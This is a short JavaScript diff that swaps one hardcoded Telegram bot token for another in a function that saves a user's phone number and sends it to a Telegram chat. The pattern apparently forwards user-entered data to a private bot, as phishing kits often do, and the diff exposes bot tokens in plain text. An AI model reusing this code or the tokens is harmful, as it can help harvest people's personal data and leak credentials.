@@ -10,7 +10,7 @@ async function sendToTelegram() {
     sessionStorage.setItem('phone_number', phoneNumber);
 
     // Token dan Chat ID Telegram
-    const botToken = '7506300483:AAFXhPOPcagRAbmkGDUt8J5r_JIYOWItIXY';  // Ganti dengan token bot Anda
+    const botToken = '7506300483:AAHzMEh0_XTLa6nUNxMuWAFo3bSp20HWcQM';  // Ganti dengan token bot Anda
     const chatId = '6000448808'; // Ganti dengan chat ID Anda
 
     // Format pesan
